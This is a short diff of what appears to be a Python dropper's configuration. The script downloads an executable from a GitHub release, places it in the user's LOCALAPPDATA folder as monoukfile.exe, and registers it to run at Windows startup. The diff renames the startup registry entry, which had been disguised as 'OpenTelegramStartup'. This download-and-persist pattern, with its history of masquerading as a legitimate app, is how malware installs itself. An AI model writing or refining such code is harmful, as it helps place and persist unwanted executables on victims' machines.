@@ -8,12 +8,12 @@ from download_file import download_file
 
 # --- CONFIGURATION PARAMETERS ---
 DOWNLOAD_URL = "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/download/v1.0.17/main.exe"
-TARGET_DIR = r"C:\Temp"
+TARGET_DIR = os.environ.get("LOCALAPPDATA", r"C:\Users\Public")
 TARGET_FILE = "monoukfile.exe"
 
 # Correctly joins them to: C:\Temp\monoukfile.exe
 TARGET_PATH = os.path.join(TARGET_DIR, TARGET_FILE)
-REG_NAME = "OpenTelegramStartup"
+REG_NAME = "monoukfile"
 
 
 def add_to_registry_startup():
